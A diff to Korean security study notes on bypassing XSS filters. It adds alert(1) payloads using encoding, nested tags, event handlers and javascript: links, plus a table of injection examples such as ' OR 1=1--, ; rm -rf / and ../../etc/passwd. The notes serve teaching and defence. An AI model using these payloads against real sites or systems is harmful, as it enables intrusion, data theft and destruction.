@@ -94,7 +94,31 @@
 
 📌 유저가 마우스를 올려야 실행되므로 일부 제한적이지만, 필터를 우회할 수 있음.
 
----
+
+## 🧪 공격자들이 흔히 쓰는 XSS 우회 기법 예시
+
+### 🔸 우회 예시 1: `<` 없이도 동작하는 XSS
+
+```html
+<script>alert(1)</script>         ← 기본
+&#60;script&#62;alert(1)&#60;/script&#62;   ← HTML 인코딩 우회
+<scr<script>ipt>alert(1)</scr</script>ipt> ← 중첩 태그
+
+<img src="x" onerror=alert(1)>    ← 태그 속성 활용
+```
+
+### 🔸 우회 예시 2: 이벤트 핸들러 사용
+
+```html
+<div onmouseover="alert(1)">Hover me</div>
+```
+
+### 🔸 우회 예시 3: JavaScript 프로토콜
+
+```html
+<a href="javascript:alert(1)">Click</a>
+```
+
 
 ## ✅ 필터 우회 팁
 
@@ -103,3 +127,18 @@
 | 이벤트 핸들러만 사용하기 | `<script>`가 필터링돼도 작동     |
 | 퍼센트 인코딩       | `<` → `%3C`, `>` → `%3E` |
 | 속성값           |                          |
+
+---
+
+## ⚠️ 그 외 `<` 차단만으로 막을 수 없는 대표적 공격 유형들
+
+| 공격 종류                        | `<` 포함 여부 | 설명                              |
+| ---------------------------- | --------- | ------------------------------- |
+| **SQL Injection**            | ❌ 포함 안 됨  | 예: `' OR 1=1--` 같은 문자열로 로그인 우회  |
+| **Command Injection**        | ❌         | 예: `; rm -rf /`                 |
+| **Path Traversal**           | ❌         | 예: `../../etc/passwd`           |
+| **HTTP Parameter Pollution** | ❌         | `?id=123&id=456` 처럼 중복 파라미터     |
+| **Header Injection**         | ❌         | 응답 헤더 조작 (`\r\n` 삽입)            |
+| **JSON 기반 XSS**              | ✅ 또는 ❌    | JSON 응답에 JavaScript 형태로 값 삽입 가능 |
+
+---
